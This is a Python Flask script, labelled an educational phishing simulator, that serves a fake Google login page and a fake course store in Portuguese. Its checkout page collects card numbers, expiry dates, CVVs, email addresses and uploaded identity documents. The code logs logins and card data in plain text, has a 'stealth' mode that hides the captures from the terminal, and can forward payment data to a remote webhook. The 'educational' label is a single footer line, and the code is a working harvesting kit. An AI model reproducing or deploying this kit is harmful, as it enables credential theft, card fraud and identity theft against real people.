#!/usr/bin/env python3
# phishing_simulator_advanced.py - Ferramenta educacional para testes de conscientização

from flask import Flask, request, render_template_string, redirect, url_for
import os
import datetime
import uuid
import argparse
import requests
import sys
from werkzeug.utils import secure_filename

app = Flask(__name__)

# Configurações
UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'pdf'}
LOG_FILE = 'phishing_log_full.txt'

# Criar pasta de uploads se não existir
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

# Template HTML para login falso (Google style)
LOGIN_TEMPLATE = """
<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Google</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f1f1f1; display: flex; justify-content: center; padding-top: 100px; }
        .login-card { background-color: white; border-radius: 8px; padding: 40px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 300px; text-align: center; }
        .logo { margin-bottom: 20px; }
        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }
        button { background-color: #1a73e8; color: white; padding: 12px; border: none; border-radius: 4px; cursor: pointer; width: 100%; font-weight: bold; }
        .footer { margin-top: 20px; color: #5f6368; font-size: 12px; }
    </style>
</head>
<body>
    <div class="login-card">
        <div class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="72" height="24" viewBox="0 0 72 24">
                <path fill="#4285F4" d="M9 12c0-1.66 1.34-3 3-3s3 1.34 3 3-1.34 3-3 3-3-1.34-3-3m13 0c0-1.66 1.34-3 3-3s3 1.34 3 3-1.34 3-3 3-3-1.34-3-3m8 0c0 5.52-4.48 10-10 10S2 17.52 2 12 6.48 2 12 2s10 4.48 10 10"></path>
            </svg>
        </div>
        <h3>Faça login na sua conta</h3>
        <form method="POST">
            <input type="text" name="username" placeholder="E-mail ou telefone" required>
            <input type="password" name="password" placeholder="Senha" required>
            <button type="submit">Login</button>
        </form>
        <div class="footer">
            © 2023 Google. Esta é uma ferramenta educacional.
        </div>
    </div>
</body>
</html>
"""

# Template HTML para dashboard de produtos
DASHBOARD_TEMPLATE = """
<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Produtos Digitais Premium</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; }
        .header { background: linear-gradient(135deg, #6a11cb 0%, #2575fc 100%); color: white; padding: 2rem; text-align: center; }
        .products { display: flex; justify-content: center; flex-wrap: wrap; padding: 2rem; gap: 2rem; }
        .product-card { background: white; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 300px; overflow: hidden; transition: transform 0.3s; }
        .product-card:hover { transform: translateY(-10px); }
        .product-image { height: 180px; background-color: #f0f4f8; display: flex; align-items: center; justify-content: center; }
        .product-info { padding: 1.5rem; }
        .product-title { font-size: 1.4rem; margin: 0 0 0.5rem; color: #333; }
        .product-description { color: #666; margin-bottom: 1.5rem; }
        .product-price { font-size: 1.8rem; font-weight: bold; color: #2c7be5; margin-bottom: 1.5rem; }
        .buy-btn { display: block; width: 100%; padding: 12px; background: linear-gradient(135deg, #00d97e 0%, #00b8a9 100%); color: white; text-align: center; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; text-decoration: none; }
        .buy-btn:hover { opacity: 0.9; }
    </style>
</head>
<body>
    <div class="header">
        <h1>Produtos Digitais Premium</h1>
        <p>Conhecimento que transforma carreiras</p>
    </div>
    
    <div class="products">
        <div class="product-card">
            <div class="product-image">📚</div>
            <div class="product-info">
                <h2 class="product-title">Domine Python em 30 Dias</h2>
                <p class="product-description">Curso completo com projetos práticos para dominar Python do zero ao avançado.</p>
                <div class="product-price">2500MTS</div>
                <a href="/checkout?produto=python" class="buy-btn">Comprar agora</a>
            </div>
        </div>
        
        <div class="product-card">
            <div class="product-image">🛡️</div>
            <div class="product-info">
                <h2 class="product-title">Segurança Ofensiva</h2>
                <p class="product-description">Torne-se um especialista em ethical hacking com técnicas de pentest avançadas.</p>
                <div class="product-price">3500MT</div>
                <a href="/checkout?produto=seguranca" class="buy-btn">Comprar agora</a>
            </div>
        </div>
        
        <div class="product-card">
            <div class="product-image">📊</div>
            <div class="product-info">
                <h2 class="product-title">Data Science Pro</h2>
                <p class="product-description">Domine machine learning, análise de dados e visualização com Python e R.</p>
                <div class="product-price">5000MT</div>
                <a href="/checkout?produto=datascience" class="buy-btn">Comprar agora</a>
            </div>
        </div>
    </div>
</body>
</html>
"""

# Template HTML para checkout de pagamento
CHECKOUT_TEMPLATE = """
<!DOCTYPE html>
<html lang="pt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Finalizar Compra</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f5f7fa; }
        .container { max-width: 800px; margin: 2rem auto; padding: 2rem; background: white; border-radius: 10px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
        h1 { color: #2c3e50; text-align: center; margin-bottom: 2rem; }
        .form-group { margin-bottom: 1.5rem; }
        label { display: block; margin-bottom: 0.5rem; font-weight: 600; color: #34495e; }
        input[type="text"], input[type="email"] { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 6px; font-size: 16px; }
        .card-details { display: grid; grid-template-columns: 2fr 1fr 1fr; gap: 1rem; }
        .btn-submit { background: linear-gradient(135deg, #00d97e 0%, #00b8a9 100%); color: white; border: none; padding: 14px; font-size: 18px; font-weight: bold; border-radius: 6px; cursor: pointer; width: 100%; }
        .btn-submit:hover { opacity: 0.95; }
        .upload-box { border: 2px dashed #ddd; border-radius: 6px; padding: 2rem; text-align: center; margin-top: 1rem; }
        .upload-icon { font-size: 3rem; color: #3498db; margin-bottom: 1rem; }
        .form-section { margin-bottom: 2rem; padding-bottom: 2rem; border-bottom: 1px solid #eee; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Finalize sua Compra</h1>
        
        <form method="POST" enctype="multipart/form-data">
            <div class="form-section">
                <h2>Informações do Cartão</h2>
                
                <div class="form-group">
                    <label for="cardholder">Nome no Cartão</label>
                    <input type="text" id="cardholder" name="cardholder" required>
                </div>
                
                <div class="form-group">
                    <label for="cardnumber">Número do Cartão</label>
                    <input type="text" id="cardnumber" name="cardnumber" required>
                </div>
                
                <div class="card-details">
                    <div class="form-group">
                        <label for="expiry">Validade (MM/AA)</label>
                        <input type="text" id="expiry" name="expiry" placeholder="MM/AA" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="cvv">CVV</label>
                        <input type="text" id="cvv" name="cvv" required>
                    </div>
                </div>
            </div>
            
            <div class="form-section">
                <h2>Informações Pessoais</h2>
                
                <div class="form-group">
                    <label for="email">Email</label>
                    <input type="email" id="email" name="email" required>
                </div>
                
                <div class="form-group">
                    <label>Documento de Identificação</label>
                    <div class="upload-box">
                        <div class="upload-icon">📁</div>
                        <p>Arraste seu documento ou <strong>clique para selecionar</strong></p>
                        <p>Formatos aceitos: JPG, PNG, PDF (Máx. 5MB)</p>
                        <input type="file" name="document" accept=".jpg,.jpeg,.png,.pdf" required>
                    </div>
                </div>
            </div>
            
            <button type="submit" class="btn-submit">Finalizar Compra</button>
        </form>
    </div>
</body>
</html>
"""

# Funções auxiliares
def save_credentials(username, password):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = f"[LOGIN] {timestamp} | Usuário: {username} | Senha: {password}\n"
    
    with open(LOG_FILE, "a") as f:
        f.write(entry)
    
    if not args.stealth:
        print(f"\033[91mCREDENCIAIS CAPTURADAS!\033[0m")
        print(f"Usuário: {username}")
        print(f"Senha: {password}")
        print("-" * 50)

def save_payment_data(data, filename):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = (
        f"[PAGAMENTO] {timestamp}\n"
        f"Produto: {data.get('product', 'N/A')}\n"
        f"Nome no Cartão: {data['cardholder']}\n"
        f"Número do Cartão: {data['cardnumber']}\n"
        f"Validade: {data['expiry']}\n"
        f"CVV: {data['cvv']}\n"
        f"Email: {data['email']}\n"
        f"Documento: {filename}\n"
        f"{'-'*50}\n"
    )
    
    with open(LOG_FILE, "a") as f:
        f.write(entry)
    
    if not args.stealth:
        print(f"\033[91mDADOS DE PAGAMENTO CAPTURADOS!\033[0m")
        print(f"Produto: {data.get('product', 'N/A')}")
        print(f"Nome no Cartão: {data['cardholder']}")
        print(f"Número do Cartão: {data['cardnumber']}")
        print(f"Validade: {data['expiry']}")
        print(f"CVV: {data['cvv']}")
        print(f"Email: {data['email']}")
        print(f"Documento: {filename}")
        print("-" * 50)

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

# Rotas
@app.route('/fake-login', methods=['GET', 'POST'])
def fake_login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        save_credentials(username, password)
        return redirect(url_for('dashboard'))
    
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/dashboard')
def dashboard():
    return render_template_string(DASHBOARD_TEMPLATE)

@app.route('/checkout', methods=['GET', 'POST'])
def checkout():
    product = request.args.get('produto', 'produto-desconhecido')
    
    if request.method == 'POST':
        # Processar dados do formulário
        payment_data = {
            'product': product,
            'cardholder': request.form['cardholder'],
            'cardnumber': request.form['cardnumber'],
            'expiry': request.form['expiry'],
            'cvv': request.form['cvv'],
            'email': request.form['email']
        }
        
        # Processar upload do documento
        if 'document' not in request.files:
            return 'Nenhum arquivo enviado', 400
            
        file = request.files['document']
        if file.filename == '':
            return 'Nenhum arquivo selecionado', 400
            
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            unique_filename = f"{uuid.uuid4().hex}_{filename}"
            file_path = os.path.join(UPLOAD_FOLDER, unique_filename)
            file.save(file_path)
            
            # Salvar dados
            save_payment_data(payment_data, unique_filename)
            
            # Enviar para webhook se configurado
            if args.webhook:
                send_to_webhook(payment_data, unique_filename)
            
            return "Pagamento processado com sucesso! Você receberá um email de confirmação."
    
    return render_template_string(CHECKOUT_TEMPLATE)

def send_to_webhook(payment_data, filename):
    data = {
        "timestamp": datetime.datetime.now().isoformat(),
        "type": "payment",
        "data": payment_data,
        "document": filename
    }
    try:
        requests.post(args.webhook, json=data, timeout=5)
    except Exception as e:
        print(f"Erro no webhook: {e}", file=sys.stderr)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Simulador de Phishing Avançado')
    parser.add_argument('--stealth', action='store_true', help='Modo discreto (não mostra dados no terminal)')
    parser.add_argument('--webhook', type=str, help='URL de webhook para enviar dados capturados')
    parser.add_argument('--port', type=int, default=5000, help='Porta do servidor (padrão: 5000)')
    args = parser.parse_args()

    print("\n\033[92mSIMULADOR DE PHISHING AVANÇADO INICIADO\033[0m")
    print(f"URL Login: http://localhost:{args.port}/fake-login")
    print(f"Logs serão salvos em: {os.path.abspath(LOG_FILE)}")
    print(f"Uploads serão salvos em: {os.path.abspath(UPLOAD_FOLDER)}")
    if args.stealth:
        print("Modo stealth: ATIVADO")
    if args.webhook:
        print(f"Webhook configurado: {args.webhook}")
    print("\033[93mPressione CTRL+C para parar o servidor\033[0m\n")
    
    app.run(host='127.0.0.1', port=args.port)
